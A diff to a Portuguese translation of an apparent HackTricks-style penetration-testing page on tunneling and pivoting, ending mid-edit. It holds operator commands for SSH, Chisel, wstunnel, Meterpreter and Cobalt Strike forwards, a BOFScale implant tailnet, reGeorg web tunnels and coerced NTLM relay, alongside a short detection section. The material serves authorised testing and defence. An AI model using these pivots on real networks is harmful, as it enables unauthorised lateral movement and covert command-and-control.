@@ -1,8 +1,8 @@
-# Tunelamento e Encaminhamento de Portas
+# Tunelamento e encaminhamento de portas
 
 {{#include ../banners/hacktricks-training.md}}
 
-Para publicar um serviço HTTP ou TCP local por meio de um relay público, consulte [expondo serviços locais à internet](expose-local-to-the-internet.md). Este capítulo aborda o encaminhamento e o pivoting entre hosts.
+Para publicar um serviço HTTP ou TCP local por meio de um relay público, consulte [exposing local services to the internet](expose-local-to-the-internet.md). Este capítulo aborda o encaminhamento e o pivoting entre hosts.
 
 ## Dica do Nmap
 
@@ -33,11 +33,11 @@ evil-winrm -u username -i Jump
 
 ## **SSH**
 
-O OpenSSH pode encaminhar conexões X11, portas TCP arbitrárias e sockets de domínio Unix pelo canal criptografado.<sup>[[6]](#references)</sup>
+O OpenSSH pode encaminhar conexões X11, portas TCP arbitrárias e sockets de domínio Unix pelo seu canal criptografado.<sup>[[6]](#references)</sup>
 
 Conexão gráfica SSH (X)
 
-`-Y` habilita o encaminhamento confiável de X11 e `-C` solicita a compressão dos dados encaminhados.<sup>[[6]](#references)</sup>
+`-Y` habilita o encaminhamento confiável de X11, e `-C` solicita a compressão dos dados encaminhados.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
@@ -45,9 +45,9 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 
 ### Remote Port2Port
 
-Abra uma nova porta no servidor SSH --> Outra porta
+Abrir nova porta no servidor SSH --> Outra porta
 
-O encaminhamento remoto (`-R`) escuta no servidor SSH e se conecta ao lado local; o endereço de vinculação explícito controla quais interfaces podem acessar esse listener.<sup>[[6]](#references)</sup>
+O encaminhamento remoto (`-R`) escuta no servidor SSH e se conecta ao lado local; o endereço de bind explícito controla quais interfaces podem alcançar esse listener.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
@@ -61,7 +61,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 
 Porta local --> Host comprometido (SSH) --> Third_box:Port
 
-O encaminhamento local (`-L`) escuta no cliente e conecta ao destino pelo lado do servidor SSH.<sup>[[6]](#references)</sup>
+O encaminhamento local (`-L`) escuta no cliente e se conecta ao destino pelo lado do servidor SSH.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
@@ -73,7 +73,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 
 Porta local --> Host comprometido (SSH) --> Qualquer lugar
 
-O encaminhamento dinâmico (`-D`) cria um listener local SOCKS4/SOCKS5, cujas conexões são abertas pelo lado remoto.<sup>[[6]](#references)</sup>
+O encaminhamento dinâmico (`-D`) cria um listener SOCKS4/SOCKS5 local cujas conexões são abertas pelo lado remoto.<sup>[[6]](#references)</sup>
 
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
@@ -81,7 +81,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 
 ### Multi-hop com ProxyJump
 
-`-J`/`ProxyJump` conecta-se ao alvo por meio de um ou mais jump hosts separados por vírgulas. As opções de encaminhamento ainda pertencem à conexão SSH final, então o listener SOCKS abaixo abre destinos a partir de `internal-target`, não do primeiro bastion. Isso evita fazer login em um jump host e iniciar um segundo cliente SSH nele.<sup>[[6]](#references)</sup>
+`-J`/`ProxyJump` conecta ao destino por meio de um ou mais hosts de salto separados por vírgulas. As opções de encaminhamento ainda pertencem à conexão SSH final, então o listener SOCKS abaixo abre destinos a partir de `internal-target`, não do primeiro bastion. Isso evita fazer login em um host de salto e iniciar um segundo cliente SSH nele.<sup>[[6]](#references)</sup>
 
 ```bash
 # Reach the final SSH server through two bastions
@@ -95,9 +95,9 @@ As opções específicas do host para máquinas jump devem ser colocadas em `~/.
 
 ### Reverse Port Forwarding
 
-Isso é útil para obter reverse shells de hosts internos por meio de uma DMZ até seu host:
+Isso é útil para obter reverse shells de hosts internos através de uma DMZ até o seu host:
 
-A configuração `GatewayPorts` do servidor controla se um forward remoto pode ser vinculado além do loopback; seu valor padrão é `no`.<sup>[[7]](#references)</sup>
+A configuração `GatewayPorts` do servidor controla se um encaminhamento remoto pode se vincular além do loopback; o padrão é `no`.<sup>[[7]](#references)</sup>
 
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
@@ -108,9 +108,9 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
 ```
 
-### Túnel VPN
+### VPN-Tunnel
 
-Este exemplo baseado em root cria dispositivos de túnel em ambos os hosts. O servidor deve permitir o encaminhamento tun, e a conta selecionada precisa ter acesso ao dispositivo tun; `PermitRootLogin yes` é uma maneira de usar a conta `root` neste caso.<sup>[[6]](#references)[[7]](#references)</sup>\
+Este exemplo baseado em root cria dispositivos de túnel em ambos os hosts. O servidor deve permitir o encaminhamento tun, e a conta selecionada deve ter acesso ao dispositivo tun; `PermitRootLogin yes` é uma maneira de usar a conta `root` neste caso.<sup>[[6]](#references)[[7]](#references)</sup>\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 
@@ -129,7 +129,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 
-Defina uma nova rota no lado do cliente
+Configure uma nova rota no lado do cliente
 
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
@@ -137,14 +137,14 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 > [!NOTE]
 > **Segurança – Ataque Terrapin (CVE-2023-48795)**  
-> O OpenSSH 9.6 adicionou uma extensão strict-KEX para combater o ataque de integridade no transporte inicial do Terrapin. Atualize ambos os peers sempre que possível e siga as orientações do fornecedor para implementações mais antigas, em vez de presumir que um canal encaminhado está protegido apenas pela versão.<sup>[[8]](#references)</sup>
+> O OpenSSH 9.6 adicionou uma extensão strict-KEX para combater o ataque de integridade no transporte inicial do Terrapin. Atualize ambos os pares sempre que possível e siga as orientações dos fornecedores para implementações mais antigas, em vez de presumir que um canal encaminhado está protegido apenas pela versão.<sup>[[8]](#references)</sup>
 
 ## SSHUTTLE
 
-Você pode **tunelar** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
+Você pode **tunelar** por meio do **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
 Por exemplo, encaminhar todo o tráfego destinado a 10.10.10.0/24
 
-`sshuttle` fornece proxy transparente via SSH e permite selecionar sub-redes e usar um comando SSH personalizado, conforme mostrado abaixo.<sup>[[9]](#references)</sup>
+`sshuttle` oferece proxy transparente por SSH e permite selecionar sub-redes e um comando SSH personalizado, conforme mostrado abaixo.<sup>[[9]](#references)</sup>
 
 ```bash
 pip install sshuttle
@@ -160,7 +160,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ## Meterpreter
 
-`portfwd` do Metasploit oferece suporte a encaminhamento local e remoto, enquanto o módulo de proxy SOCKS foi projetado para funcionar com rotas de sessão ou `autoroute` e, nestes exemplos, escuta na porta 1080 por padrão.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
+O `portfwd` do Metasploit oferece encaminhamento local e remoto, enquanto o módulo de proxy SOCKS foi projetado para funcionar com rotas de sessão ou `autoroute` e, nestes exemplos, escuta na porta 1080 por padrão.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
 
 ### Port2Port
 
@@ -198,11 +198,11 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ## Cobalt Strike
 
-O Beacon do Cobalt Strike pode retransmitir conexões SOCKS4a/SOCKS5 por meio de um Beacon; `rportfwd` faz bind em uma porta no host comprometido, enquanto `rportfwd_local` inicia a conexão com o destino a partir do cliente do Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>
+O Beacon do Cobalt Strike pode retransmitir conexões SOCKS4a/SOCKS5 por meio de um Beacon; `rportfwd` faz bind no host comprometido, enquanto `rportfwd_local` inicia a conexão com o destino a partir do cliente do Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>
 
-### Proxy SOCKS
+### SOCKS proxy
 
-Abra uma porta no Team Server nas interfaces que devem encaminhar o tráfego pelo Beacon.<sup>[[13]](#references)</sup>
+Abra uma porta no Team Server nas interfaces que devem rotear o tráfego pelo Beacon.<sup>[[13]](#references)</sup>
 
 ```bash
 beacon> socks 1080
@@ -215,7 +215,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Neste caso, a **porta é aberta no host Beacon**, não no Team Server, e o tráfego é enviado ao Team Server e, de lá, ao host:porta indicado.<sup>[[14]](#references)</sup>
+> Neste caso, a **porta é aberta no host do Beacon**, não no Team Server, e o tráfego é enviado ao Team Server e, de lá, ao host:porta indicado.<sup>[[14]](#references)</sup>
 
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -224,7 +224,7 @@ rportfwd stop [bind port]
 
 O manual de reverse-forwarding observa o seguinte comportamento:<sup>[[14]](#references)</sup>
 
-- O reverse port forward do Beacon foi projetado para **encaminhar tráfego ao Team Server, não para retransmitir tráfego entre máquinas individuais**.
+- O reverse port forward do Beacon foi projetado para **tunelar tráfego até o Team Server, não para retransmitir tráfego entre máquinas individuais**.
 - O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
 - Portas altas geralmente evitam restrições de portas privilegiadas, mas as políticas do sistema operacional de destino e os listeners existentes ainda se aplicam.
 
@@ -238,11 +238,28 @@ rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
 
-## Tailcat: encaminhamento TCP em espaço de usuário sem conta
+## Overlay de userspace do Yggdrasil com yggstack
 
-Tailcat usa o plano de dados WireGuard/NAT traversal/DERP do Tailscale sem o plano de controle do Tailscale. Não precisa de uma conta do Tailscale nem de privilégios de administrador, e não instala rotas de host nem altera o DNS. Ao contrário de [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) ou do [tailnet BOFScale](#bofscale---cdn-fronted-in-process-tailnet) em processo, o servidor compartilha um *endereço Tailcat* por um canal externo. O cliente usa esse endereço para acessar uma porta servida pelo nó remoto.<sup>[[62]](#references)</sup>
+[Yggstack](https://github.com/yggdrasil-network/yggstack) conecta-se à mesh IPv6 criptografada do Yggdrasil sem uma interface TUN ou privilégios de administrador. Ele fornece um listener SOCKS5 local para conexões que entram no overlay e encaminhamento TCP em qualquer direção.<sup>[[64]](#references)</sup> Um pivot precisa conseguir alcançar um peer configurado, e o endpoint do operador também precisa entrar na mesh para alcançar seu endereço no overlay.<sup>[[65]](#references)</sup>
 
-Para um serviço TCP que já esteja escutando na porta `4444` do nó remoto, inicie `serve` nesse nó e passe o endereço exibido para `forward` no cliente. O segundo comando vincula `127.0.0.1:18080` por padrão, para que um processo local compatível apenas com sockets TCP normais possa se conectar a essa porta de loopback, enquanto o Tailcat transporta o tráfego até a porta remota `4444`.<sup>[[62]](#references)</sup> Os números das portas não são específicos do Tailcat.<sup>[[62]](#references)</sup>
+Gere uma configuração e adicione um URI de peer acessível à seção `Peers`; em seguida, escolha o listener SOCKS ou o modo de exposição de porta remota.<sup>[[64]](#references)[[65]](#references)</sup> Este último expõe um serviço vinculado a `127.0.0.1:8080` na porta `18080` do endereço Yggdrasil do nó, não na Internet comum. Em uma mesh pública, outros nós do overlay podem alcançar o serviço exposto, portanto, uma conexão de peer não é um limite de controle de acesso.<sup>[[64]](#references)[[66]](#references)</sup> Os comandos abaixo são execuções alternativas do mesmo nó.<sup>[[64]](#references)</sup>
+
+```bash
+./yggstack -genconf > yggdrasil.conf
+# Add a peer URI to the Peers section of yggdrasil.conf first.
+./yggstack -useconffile yggdrasil.conf -socks 127.0.0.1:1080
+./yggstack -useconffile yggdrasil.conf -remote-tcp 18080:127.0.0.1:8080
+```
+
+Um agent Go pode incorporar a stack de userspace em vez de iniciar um processo `yggstack` separado. A ESET documentou uma implementação que gerava uma nova identidade Ed25519 a cada inicialização, alterando seu endereço IPv6 de overlay, e definia `NodeInfo` vazio e `NodeInfoPrivacy` para limitar os metadados do nó divulgados. Ela se comunicava com um endpoint HTTPS dentro da mesh e podia expor um listener TCP local pelo seu endereço de overlay.<sup>[[64]](#references)[[67]](#references)</sup>
+
+O overlay pode ocultar o destino final de uma visão comum do tráfego de saída, mas não as conexões entre peers nem o IP de origem visível para os peers diretos. O Yggdrasil não fornece anonimato.<sup>[[66]](#references)[[67]](#references)</sup> Consulte [privacidade de rede e conectividade anônima](../privacy/network-privacy-and-anonymous-connectivity.md) para ver a distinção entre transporte criptografado e anonimato.
+
+## Tailcat: encaminhamento TCP em userspace sem conta
+
+O Tailcat usa o plano de dados WireGuard/NAT-traversal/DERP do Tailscale sem o plano de controle do Tailscale. Não precisa de uma conta Tailscale nem de privilégios de administrador, e não instala rotas no host nem altera o DNS. Diferentemente de [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) ou do [tailnet BOFScale em processo](#bofscale---cdn-fronted-in-process-tailnet), o servidor compartilha um *endereço tailcat* por um canal externo. O cliente usa esse endereço para alcançar uma porta servida pelo nó remoto.<sup>[[62]](#references)</sup>
+
+Para um serviço TCP que já esteja escutando na porta `4444` do nó remoto, inicie `serve` nesse nó e passe o endereço exibido para `forward` no cliente. Por padrão, o segundo comando faz bind em `127.0.0.1:18080`, então um processo local que só aceite sockets TCP normais pode se conectar a essa porta de loopback enquanto o Tailcat transporta o tráfego até a porta remota `4444`.<sup>[[62]](#references)</sup> Os números das portas não são específicos do Tailcat.<sup>[[62]](#references)</sup>
 
 ```bash
 # Remote node with a service on localhost:4444
@@ -251,34 +268,34 @@ tailcat serve 4444
 tailcat forward <tc-address> 18080:4444
 ```
 
-O endereço contém a chave pública WireGuard do servidor e, por padrão nas versões atuais, uma chave pré-compartilhada. Trate-o como uma credencial: um servidor sem restrições aceita peers que conheçam o endereço. Um endereço efêmero deixa de funcionar quando o servidor é encerrado. Uma chave `default` salva faz com que `serve` simples reutilize um endereço estável em execuções posteriores; portanto, verifique a mensagem de inicialização e restrinja os clientes com `serve --allow` se o endereço puder ser exposto.<sup>[[62]](#references)</sup>
+O endereço contém a chave pública WireGuard do servidor e, por padrão nas versões atuais, uma chave pré-compartilhada. Trate-o como uma credencial: um servidor sem restrições aceita um peer que conheça o endereço. Um endereço efêmero deixa de funcionar quando o servidor é encerrado. Uma chave `default` salva faz com que `serve` reutilize um endereço estável nas execuções seguintes; portanto, verifique a mensagem de inicialização e restrinja os clientes com `serve --allow` se o endereço puder ser exposto.<sup>[[62]](#references)</sup>
 
-As conexões podem usar um caminho UDP direto ou um relay DERP. Isso evita a necessidade de um domínio C2 dedicado, mas não faz a atividade de rede desaparecer.<sup>[[62]](#references)[[63]](#references)</sup>
+As conexões podem usar um caminho UDP direto ou um relay DERP. Isso evita exigir um domínio C2 dedicado, mas não faz com que a atividade de rede desapareça.<sup>[[62]](#references)[[63]](#references)</sup>
 
-## BOFScale - tailnet em processo com fronting de CDN
+## BOFScale - tailnet em processo com front-end CDN
 
-[BOFScale](https://github.com/NetSPI/BOFscale) executa um overlay Tailscale modificado dentro de um implante C2 do Windows, sem instalar um driver ou serviço TUN. Seus três componentes são um BOF-PE assíncrono `tailscaled` CGo `c-shared`, um pequeno BOF-PE C++ que se comunica com a API local e uma bridge TCP-para-SOCKS5 assíncrona `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>
+[BOFScale](https://github.com/NetSPI/BOFscale) executa um overlay Tailscale modificado dentro de um implante C2 do Windows, sem instalar um driver TUN ou serviço. Seus três componentes são um BOF-PE `tailscaled` assíncrono `CGo` `c-shared`, um pequeno BOF-PE C++ que se comunica com a API local e uma ponte TCP-para-SOCKS5 assíncrona `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>
 
 ### TS2021 e DERP compatíveis com CDN
 
-O Tailscale normalmente usa upgrades HTTP proprietários para o canal de controle TS2021 baseado em Noise e para o relay DERP. O BOFScale mantém esses fluxos de bytes, mas os transporta em WebSockets RFC 6455, usando `Sec-WebSocket-Protocol: ts2021` ou `derp`, para que uma origem Headscale/DERP controlada pelo operador possa ficar atrás de uma CDN que aceita apenas upgrades WebSocket padrão. O cliente com patch tenta novamente TS2021 por WebSockets após HTTP `500`, tenta novamente DERP após HTTP `426` e faz com que o discador WebSocket DERP respeite a configuração de proxy do host; o BOF define `TS_DEBUG_DERP_WS_CLIENT=1` para ignorar a primeira tentativa, conhecida por falhar.<sup>[[53]](#references)[[54]](#references)</sup>
+O Tailscale normalmente usa upgrades HTTP proprietários para o canal de controle TS2021 baseado em Noise e o relay DERP. O BOFScale mantém esses fluxos de bytes, mas os transporta em WebSockets RFC 6455, usando `Sec-WebSocket-Protocol: ts2021` ou `derp`, para que uma origem Headscale/DERP controlada pelo operador possa ficar atrás de uma CDN que aceita apenas upgrades WebSocket padrão. O cliente corrigido tenta novamente o TS2021 por WebSockets após um HTTP `500`, tenta novamente o DERP após um HTTP `426` e faz com que o discador WebSocket DERP respeite a configuração de proxy do host; o BOF define `TS_DEBUG_DERP_WS_CLIENT=1` para ignorar a primeira tentativa, que se sabe falhar.<sup>[[53]](#references)[[54]](#references)</sup>
 
-A CDN e o proxy de origem devem preservar os upgrades WebSocket para `/ts2021` e `/derp`, encaminhar `/key` como HTTP comum e desativar os timeouts internos de leitura/escrita, pois as sessões de relay podem permanecer abertas indefinidamente. A configuração Headscale fornecida habilita `verify_clients`, publica apenas o mapa DERP incorporado do operador e deixa `derp.urls` vazio para impedir o fallback para relays operados pelo Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>
+A CDN e o proxy de origem devem preservar os upgrades WebSocket para `/ts2021` e `/derp`, encaminhar `/key` como HTTP comum e desativar os timeouts internos de leitura/escrita, pois as sessões de relay podem permanecer abertas indefinidamente. A configuração fornecida do Headscale ativa `verify_clients`, publica apenas o mapa DERP incorporado do operador e deixa `derp.urls` vazio para impedir o fallback para relays operados pelo Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>
 
 ### Daemon em processo e controle por named pipe
 
-A menos que seja sobrescrito, o ponto de entrada do BOF inicia `tailscaled` com `-tun=userspace-networking`, `-state mem:` e `-no-logs-no-support`, e então cria um pipe com nome UUID. Ele redireciona stdout/stderr do Go por um pipe do sistema operacional para a API de saída do Beacon, de modo que o daemon completo e o runtime do Go permaneçam residentes, mas o estado e os logs não sejam gravados em um diretório do Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>
+A menos que seja substituído, o ponto de entrada do BOF inicia `tailscaled` com `-tun=userspace-networking`, `-state mem:` e `-no-logs-no-support`, e então cria um pipe com nome baseado em UUID. Ele redireciona stdout/stderr do Go por um pipe do SO para a API de saída do Beacon, mantendo o daemon completo e o runtime Go residentes, mas sem gravar estado e logs em um diretório do Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>
 
-O cliente leve reproduz a API local HTTP/1.0 do Tailscale por esse pipe. Ele abre o pipe com `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` porque a camada `safesocket` do daemon personifica o cliente do pipe, envia `Tailscale-Cap: 125` e mapeia a API local para operações de ativação, desativação, status, anúncio de rotas e encerramento.<sup>[[53]](#references)[[54]](#references)</sup>
+O cliente leve reproduz a API local HTTP/1.0 do Tailscale por esse pipe. Ele abre o pipe com `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` porque a camada `safesocket` do daemon assume a identidade do cliente do pipe, envia `Tailscale-Cap: 125` e mapeia a API local para operações de ativação, desativação, status, anúncio de rotas e encerramento.<sup>[[53]](#references)[[54]](#references)</sup>
 
 > [!WARNING]
-> Não descarregue um BOF-PE Go mapeado manualmente depois de solicitar o encerramento do daemon: goroutines do runtime e do coletor de lixo podem continuar executando a partir de memória que o loader desmapeia. Execute `tailscaled` em um processo descartável e encerre esse processo para a limpeza final.<sup>[[54]](#references)</sup>
+> Não descarregue um BOF-PE Go mapeado manualmente após solicitar o encerramento do daemon: goroutines do runtime e do garbage collector podem continuar executando a partir da memória que o loader desmapeia. Execute `tailscaled` em um processo descartável e encerre esse processo para a limpeza final.<sup>[[54]](#references)</sup>
 
-### Encaminhar tráfego originado no host pela SOCKS5 em userspace
+### Encaminhar tráfego originado no host por SOCKS5 em userspace
 
-As conexões de entrada do tailnet e as rotas de sub-rede anunciadas funcionam dentro da pilha de rede em userspace, mas os processos normais no host comprometido não têm uma rota do SO para o overlay. Por isso, `socksportfwd` escuta em uma porta TCP acessível pela vítima, negocia SOCKS5 `NO AUTH` com o listener `0.0.0.0:1080` do daemon, emite `CONNECT` para um destino do tailnet e retransmite os dados de forma assíncrona nos dois sentidos. Quando o destino é um nome MagicDNS, usa `ATYP_DOMAIN`, fazendo com que `tailscaled` resolva o nome sem expô-lo ao resolvedor do Windows.<sup>[[53]](#references)[[54]](#references)</sup>
+As conexões de entrada do tailnet e as rotas de sub-rede anunciadas funcionam dentro da pilha de rede em userspace, mas os processos normais no host comprometido não têm uma rota do SO para o overlay. Por isso, `socksportfwd` escuta em uma porta TCP voltada para a vítima, negocia SOCKS5 `NO AUTH` com o listener `0.0.0.0:1080` do daemon, emite `CONNECT` para um destino do tailnet e retransmite os dados nas duas direções de forma assíncrona. Se o destino for um nome MagicDNS, ele usa `ATYP_DOMAIN`, fazendo com que `tailscaled` resolva o nome sem expô-lo ao resolvedor do Windows.<sup>[[53]](#references)[[54]](#references)</sup>
 
-Abaixo é mostrado um fluxo mínimo do operador; tanto o nó do operador quanto o implante devem usar os binários com patch, pois o Tailscale padrão não consegue atravessar esse design com CDN.<sup>[[53]](#references)[[54]](#references)</sup>
+Abaixo é apresentado um fluxo mínimo para o operador; tanto o nó do operador quanto o implante devem usar os binários corrigidos, pois o Tailscale padrão não consegue atravessar esse design de CDN.<sup>[[53]](#references)[[54]](#references)</sup>
 
 ```bash
 HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
@@ -289,17 +306,17 @@ tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
 socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
 ```
 
-O encaminhamento local pode separar o listener de autenticação aparente da ferramenta de relay: force uma máquina a se autenticar na porta vinculada do host comprometido, encaminhe a conexão pela tailnet para `ntlmrelayx` e faça o relay para AD CS, LDAP, HTTP, SMB ou outro destino compatível. Consulte [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) e [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) para as etapas específicas da vulnerabilidade; BOFScale é apenas o transporte.<sup>[[54]](#references)</sup>
+O encaminhamento local pode separar o listener de autenticação aparente da ferramenta de relay: force uma máquina a se autenticar na porta vinculada do host comprometido, encaminhe o tráfego pela tailnet até `ntlmrelayx` e faça relay para AD CS, LDAP, HTTP, SMB ou outro alvo compatível. Consulte [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) e [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) para as etapas específicas da vulnerabilidade; BOFScale é apenas o transporte.<sup>[[54]](#references)</sup>
 
 ### Detecção
 
-Procure a combinação, em vez de um único indicador fraco: um runtime Go em um processo que normalmente não é baseado em Go, um pipe UUID com SDDL permissivo `D:(A;;GA;;;WD)`, um listener SOCKS inesperado em `0.0.0.0:1080` e WebSockets TLS de longa duração para endereços de CDN. Com inspeção TLS, sinalize `Sec-WebSocket-Protocol: derp` ou `ts2021` quando o processo proprietário não for um serviço `tailscaled` autorizado. As regras `bofscale.yar` do repositório fornecem assinaturas de memória para os três componentes BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>
+Procure a combinação, em vez de um único indicador fraco: um runtime Go em um processo que normalmente não usa Go, um pipe UUID com SDDL permissivo `D:(A;;GA;;;WD)`, um listener SOCKS inesperado em `0.0.0.0:1080` e conexões TLS WebSocket de longa duração para endereços de CDN. Com inspeção TLS, sinalize `Sec-WebSocket-Protocol: derp` ou `ts2021` quando o processo proprietário não for um serviço `tailscaled` autorizado. As regras `bofscale.yar` do repositório fornecem assinaturas de memória para os três componentes BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>
 
 ## reGeorg
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-O projeto fornece endpoints de túnel web, como `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` e `tunnel.php`; faça upload de um endpoint compatível antes de iniciar o proxy local.<sup>[[15]](#references)</sup>
+O projeto fornece endpoints de túnel web, como `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` e `tunnel.php`; carregue um endpoint compatível antes de iniciar o proxy local.<sup>[[15]](#references)</sup>
 
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
@@ -308,7 +325,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Você pode baixá-lo na página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-O Chisel transporta tráfego TCP/UDP por HTTP usando uma conexão protegida por SSH; use builds compatíveis de cliente/servidor e verifique a sintaxe dos comandos da release selecionada.<sup>[[16]](#references)</sup>
+O Chisel transporta tráfego TCP/UDP por HTTP usando uma conexão protegida por SSH; use builds compatíveis de cliente/servidor e verifique a sintaxe de comando da release selecionada.<sup>[[16]](#references)</sup>
 
 ### socks
 
@@ -332,9 +349,9 @@ O Chisel transporta tráfego TCP/UDP por HTTP usando uma conexão protegida por 
 
 [`wstunnel`](https://github.com/erebe/wstunnel) transporta encaminhamentos estáticos ou dinâmicos por WebSocket, HTTP/2 ou WebTransport (HTTP/3 sobre QUIC). As versões atuais oferecem suporte a TCP, UDP, sockets Unix, stdio, SOCKS5, proxy HTTP e listeners de proxy transparente no Linux, nos modos forward e reverse.<sup>[[52]](#references)</sup>
 
-### Pivot SOCKS5 reverso
+### Pivot reverso SOCKS5
 
-Execute o servidor no atacante e faça o pivot conectar-se de saída com `-R`. Nessa direção, o listener SOCKS5 é criado no **servidor**, enquanto as conexões solicitadas têm origem na rede do **cliente/pivot**.<sup>[[52]](#references)</sup>
+Execute o servidor na máquina do atacante e faça o pivot se conectar de saída usando `-R`. Nessa direção, o listener SOCKS5 é criado no **servidor**, enquanto as conexões solicitadas têm origem na rede do **cliente/pivot**.<sup>[[52]](#references)</sup>
 
 ```bash
 # Attacker: use a certificate valid for pivot.example
@@ -348,29 +365,29 @@ wstunnel client --tls-verify-certificate \
 proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
 ```
 
-Um reverse static forward usa a mesma direção. Por exemplo, o seguinte expõe `10.10.10.20:445`, conforme acessado pelo pivot, na porta `8445` do loopback do atacante:<sup>[[52]](#references)</sup>
+Um encaminhamento estático reverso usa a mesma direção. Por exemplo, o seguinte expõe `10.10.10.20:445`, acessível pelo pivot, na porta de loopback `8445` do atacante:<sup>[[52]](#references)</sup>
 
 ```bash
 wstunnel client --tls-verify-certificate \
   -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
 ```
 
-### Detalhes de egress e transporte
+### Detalhes de saída e transporte
 
-- Adicione `-p http://user:pass@proxy:8080` ao cliente para atravessar um proxy HTTP explícito. Use `socks5h://127.0.0.1:1080` em clientes como `curl` (ou habilite o DNS via proxy na aplicação) para que os nomes internos sejam resolvidos além do túnel, em vez de serem expostos ao resolvedor local.<sup>[[52]](#references)</sup>
-- `wss://` seleciona WebSocket protegido por TLS. Um cliente `https://` seleciona HTTP/2, mas o buffering ou a conversão para HTTP/1 por reverse proxies/CDNs costuma interromper o fluxo bidirecional; exponha o servidor wstunnel diretamente ao testar esse modo.<sup>[[52]](#references)</sup>
-- `wts://` seleciona WebTransport sobre QUIC. Inicie o servidor com `--enable-webtransport` (ou uma URL de escuta `wts://`) e permita UDP na porta de escuta. Esse modo não pode atravessar um proxy `HTTP CONNECT` convencional, pois esse proxy transporta TCP.<sup>[[52]](#references)</sup>
+- Adicione `-p http://user:pass@proxy:8080` ao cliente para atravessar um proxy HTTP explícito. Use `socks5h://127.0.0.1:1080` em clientes como `curl` (ou habilite o DNS via proxy no aplicativo) para que os nomes internos sejam resolvidos além do túnel, em vez de vazarem para o resolvedor local.<sup>[[52]](#references)</sup>
+- `wss://` seleciona WebSocket protegido por TLS. Um cliente `https://` seleciona HTTP/2, mas o buffering ou a conversão para HTTP/1 por proxies reversos/CDNs costuma interromper o fluxo bidirecional; exponha o servidor wstunnel diretamente ao testar esse modo.<sup>[[52]](#references)</sup>
+- `wts://` seleciona WebTransport sobre QUIC. Inicie o servidor com `--enable-webtransport` (ou uma URL de escuta `wts://`) e permita UDP na porta de escuta. Esse modo não pode atravessar um proxy `CONNECT` convencional porque esse proxy transporta TCP.<sup>[[52]](#references)</sup>
 
 > [!WARNING]
